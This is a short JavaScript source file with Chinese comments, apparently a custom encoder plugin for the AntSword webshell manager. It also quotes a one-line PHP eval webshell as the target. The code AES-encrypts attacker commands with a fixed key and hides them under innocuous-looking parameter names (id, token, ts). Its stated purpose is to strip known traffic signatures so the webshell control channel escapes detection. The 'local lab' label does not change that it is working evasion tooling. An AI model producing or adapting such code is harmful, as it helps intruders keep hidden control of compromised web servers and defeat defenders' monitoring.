// 蚁剑（AntSword）自定义编码器 demo：流量层魔改（编码器插件机制）
// 放置：蚁剑「编码设置→自定义编码器」；马侧配合一句话型（本地实验环境）
// 魔改面：默认编码器（base64/chr 混淆）特征全弃 → AES 自定义编码
//
// 使用：目标马 `<?php eval($_POST['a']);`（或对应魔改函数）；本编码器把命令加密后塞 a 参数
module.exports = (pwd, data) => {
  // 密钥派生：会话级随机（首包协商可扩展）；demo 用固定派生
  const key = '0123456789abcdef';
  const crypto = require('crypto');
  const cipher = crypto.createCipheriv('aes-128-cbc', key, key);
  const payload = `${pwd}=${encodeURIComponent(data[pwd])}`;
  const enc = Buffer.concat([cipher.update(Buffer.from(payload)), cipher.final()]).toString('base64');
  // 请求体重组：命令藏在正常业务参数名下（流量伪装面）
  return `id=0123&token=${enc}&ts=${Date.now()}`;
};
